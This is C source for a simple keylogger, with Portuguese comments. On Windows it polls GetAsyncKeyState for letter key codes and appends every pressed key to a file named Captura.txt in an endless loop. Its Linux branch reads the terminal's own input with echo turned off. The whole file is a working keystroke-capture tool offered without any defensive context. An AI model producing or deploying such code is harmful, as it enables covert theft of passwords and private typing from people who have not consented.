#include <stdio.h>
#include <stdlib.h>

#ifdef _WIN32
    #include <windows.h>
#elif __linux__
    #include <unistd.h>
    #include <fcntl.h>
    #include <termios.h>
#endif

int main(int argc, char const *argv[])
{
    system("clear"); // Limpar tela no Linux

    argv = argv;
    argc = argc;

    int result;
    int teclas;
    FILE *arquivo;

    arquivo = fopen("Captura.txt", "w");

    while (1)
    {
#ifdef _WIN32
        Sleep(1);
#elif __linux__
        usleep(1000); // usleep em microssegundos (1 ms)
#endif

        for (teclas = 64; teclas <= 90; teclas++)
        {
            result = 0;

#ifdef _WIN32
            result = GetAsyncKeyState(teclas);
#elif __linux__
            struct termios oldt, newt;
            int ch;
            int oldf = fcntl(STDIN_FILENO, F_GETFL, 0);
            fcntl(STDIN_FILENO, F_SETFL, oldf | O_NONBLOCK);
            tcgetattr(STDIN_FILENO, &oldt);
            newt = oldt;
            newt.c_lflag &= ~ICANON;
            newt.c_lflag &= ~ECHO;
            tcsetattr(STDIN_FILENO, TCSANOW, &newt);
            ch = getchar();
            tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
            fcntl(STDIN_FILENO, F_SETFL, oldf);
            if (ch == teclas)
            {
                result = -32767;
            }
#endif

            if (result == -32767)
            {
                fprintf(arquivo, "%c", teclas);
            }
        }
    }

    return 0;
}
